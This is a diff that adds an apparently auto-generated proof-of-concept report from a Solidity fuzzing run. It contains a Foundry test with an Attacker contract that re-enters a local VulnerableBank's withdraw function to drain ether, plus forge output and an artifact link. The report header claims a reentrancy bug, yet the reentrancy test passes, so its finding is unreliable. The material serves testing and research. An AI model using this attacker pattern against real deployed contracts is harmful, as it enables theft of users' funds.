@@ -1,0 +1,102 @@
+# PoC — Iteration 2
+# Timestamp: 20260325_235807
+# Bugs Found: Reentrancy
+# Return Code: 1
+
+## Test File
+
+// SPDX-License-Identifier: MIT
+// Auto-generated fuzz test — Iteration 2 — Seed 3019786928
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "../src/VulnerableBank.sol";
+
+contract Attacker {
+    
+    uint8 private _depth;
+    VulnerableBank private _bank;
+
+    constructor(address bank) { _bank = VulnerableBank(bank); }
+
+    receive() external payable {
+        if (_depth < 1 && address(_bank).balance > 0) {
+            _depth++;
+            _bank.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        _bank.deposit{value: msg.value}();
+        _bank.withdraw();
+    }
+
+}
+
+contract FuzzRound_2 is Test {
+    VulnerableBank bank;
+    Attacker attacker;
+
+    function setUp() public {
+        bank     = new VulnerableBank();
+        attacker = new Attacker(address(bank));
+        vm.deal(address(bank), 10 ether);
+        vm.deal(address(attacker), 1 ether);
+    }
+
+    /// @notice Forge fuzz test: يجرب قيم عشوائية لـ amount
+    function testFuzz_Withdraw(uint96 amount) public {
+        vm.assume(amount > 0 && amount <= 5 ether);
+        bank.deposit{value: amount}();
+        uint256 before = address(bank).balance;
+        bank.withdraw();
+        // Invariant: رصيد البنك لا يرتفع بعد السحب
+        assertLe(address(bank).balance, before, "Invariant violated: balance increased after withdraw");
+    }
+
+    /// @notice اختبار ثابت لثغرة الـ Reentrancy
+    function test_Reentrancy() public {
+        uint256 bankBefore = address(bank).balance;
+        attacker.attack{value: 1  ether}();
+        // إذا سرق المهاجم أكثر مما أودع → bug
+        uint256 stolen = bankBefore - address(bank).balance;
+        uint256 deposited = 1 ether; // ما أودعه المهاجم
+        if (stolen > deposited) {
+            emit log_named_uint("REENTRANCY BUG: stolen", stolen);
+            emit log_named_uint("deposited", deposited);
+            assertTrue(false, "Reentrancy: attacker drained more than deposited");
+        }
+    }
+}
+
+
+## forge Output (stdout)
+Compiling 1 files with Solc 0.8.34
+Solc 0.8.34 finished in 509.68ms
+Compiler run successful!
+
+Ran 2 tests for test/FuzzRound_2.t.sol:FuzzRound_2
+[FAIL: Transfer failed; counterexample: calldata=0xf6924c9d0000000000000000000000000000000000000000000000000000000000000972 args=[2418]] testFuzz_Withdraw(uint96) (runs: 0, μ: 0, ~: 0)
+[PASS] test_Reentrancy() (gas: 51470)
+Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 3.43ms (3.15ms CPU time)
+
+Ran 1 test suite in 8.27ms (3.43ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/FuzzRound_2.t.sol:FuzzRound_2
+[FAIL: Transfer failed; counterexample: calldata=0xf6924c9d0000000000000000000000000000000000000000000000000000000000000972 args=[2418]] testFuzz_Withdraw(uint96) (runs: 0, μ: 0, ~: 0)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+Fuzz seed: 0xb324734ab86b40cac9b8cfe1b68e168e2309e03dccc38d2f5290a1c4ea104330 (use `--fuzz-seed` to reproduce)
+
+
+## forge Output (stderr)
+Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 
+
+
+
+## Artifact Link
+https://github.com/asssaa1320/sendbox/actions/runs/23570319732
